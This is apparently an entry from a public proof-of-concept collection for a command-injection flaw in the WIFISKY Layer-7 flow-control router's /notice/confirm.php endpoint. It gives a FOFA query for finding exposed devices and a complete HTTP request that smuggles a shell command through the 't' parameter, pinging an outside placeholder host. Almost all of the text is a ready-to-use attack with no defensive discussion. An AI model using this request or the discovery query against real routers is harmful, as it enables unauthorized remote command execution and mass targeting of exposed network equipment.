## WIFISKY-7层流控路由器confirm.php接口处存在RCE漏洞


## fofa
```
title="WIFISKY 7层流控路由器"
```

## poc
```
GET /notice/confirm.php?t=;ping%20xxxx.com HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
![8035e20182b98d952c2482a5b18701cb](https://github.com/wy876/POC/assets/139549762/0f2f8a21-bd53-427b-ac86-8627f29efc92)
